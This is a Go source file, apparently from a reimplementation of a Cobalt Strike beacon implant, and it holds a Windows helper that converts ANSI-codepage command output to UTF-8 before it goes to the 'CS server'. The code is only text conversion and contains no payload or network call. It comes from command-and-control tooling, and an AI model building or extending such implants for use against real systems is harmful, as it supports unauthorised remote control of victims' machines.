//go:build windows

package packet

import (
	"golang.org/x/sys/windows"
	"main/sysinfo"
	"unicode/utf16"
	"unicode/utf8"
)

// it is hard to handle encoding problem
// beacon will send ANSI charset to CS server, then CS server use it to communicate with beacon
// in Chinese Simplified Windows, ANSI charset is 936(GBK), but golang handle all string as utf8
// Windows API have two versions, A/W. 'A' means use ANSI charset, and 'W' means use wide char(unicode)
// CreateProcess is a marco for CreateProcessA/W, which will be determined at compile time
// but in golang windows package, it simply calls CreateProcessW to keep consistent with utf8
// as now we hard code ANSI codepage as utf8, all we need to do is converting original Windows output to utf8 format

//var codepageMap = map[uint32]string{
//	936:   "gbk", // gb2312
//	950:   "big5",
//	54936: "gb18030",
//	65001: "utf8",
//}

// use charset packet will significantly improve the size of our binary....
// maybe use Windows api to do charset convert would be better, as Linux and macOS use utf8 default
//func codepageToUTF8(b []byte) ([]byte, error) {
//	// if is not utf8
//	if !utf8.Valid(b) {
//		transformer, _ := charset.Lookup(codepageMap[sysinfo.ANSICodePage])
//		if transformer == nil {
//			return nil, errors.New("unknown codepage")
//		}
//		reader := transform.NewReader(bytes.NewReader(b), transformer.NewDecoder())
//		result, err := io.ReadAll(reader)
//		if err != nil {
//			return nil, err
//		}
//		return result, nil
//	}
//	return b, nil
//}

const MB_PRECOMPOSED = 2

// but use this version will need to add two empty function for linux/darwin
func codepageToUTF8Native(b []byte) ([]byte, error) {
	if !utf8.Valid(b) {
		// set last args to zero to get the needed size
		cnt, err := windows.MultiByteToWideChar(sysinfo.ANSICodePage, MB_PRECOMPOSED, &b[0], int32(len(b)), nil, 0)
		if err != nil {
			return nil, err
		}
		utf16Bytes := make([]uint16, cnt)
		cnt, err = windows.MultiByteToWideChar(sysinfo.ANSICodePage, MB_PRECOMPOSED, &b[0], int32(len(b)), &utf16Bytes[0], cnt)
		if err != nil {
			return nil, err
		}
		utf8Bytes := utf16.Decode(utf16Bytes)
		return []byte(string(utf8Bytes)), nil
	}
	return b, nil
}
